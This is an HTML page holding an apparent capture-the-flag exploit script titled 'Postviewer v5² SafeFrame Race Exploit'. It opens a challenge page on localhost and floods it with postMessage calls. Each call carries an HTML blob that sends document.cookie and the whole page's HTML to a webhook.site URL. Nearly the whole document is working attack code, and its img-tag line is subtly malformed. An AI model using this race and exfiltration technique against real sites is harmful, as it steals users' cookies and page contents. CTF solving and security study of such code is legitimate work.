<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Postviewer v5² SafeFrame Race Exploit (Fixed)</title>
</head>
<body>
  <h1>Running SafeFrame Hijack…</h1>
  <p>Check your webhook for hits!</p>

  <script>
    const WEBHOOK = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032'; // CHANGE THIS!

    // Open challenge page
    const victim = window.open('http://localhost:1338', '_blank');

    if (!victim) {
      console.error('Failed to open victim window. Enable popups.');
    }

    // Start race to overwrite the flag file
    const spamInterval = setInterval(() => {
      // Safe: no nested <script> in template literal!
      const payload = `
        <img src='${WEBHOOK}?img='+document.cookie />
        <script>fetch('${WEBHOOK}', {
          method: 'POST',
          body: document.documentElement.innerHTML
        })<\/script>
      `;

      const blob = new Blob([payload], { type: "text/html" });

      victim.postMessage({
        type: "share",
        files: [{
          blob: blob,
          cached: false,
          name: "evilfile.txt"
        }]
      }, '*');

      console.log('[+] Sent malicious file');

    }, 20);

    setTimeout(() => {
      clearInterval(spamInterval);
      console.log('[+] Stopped spamming.');
    }, 10000);

  </script>
</body>
</html>
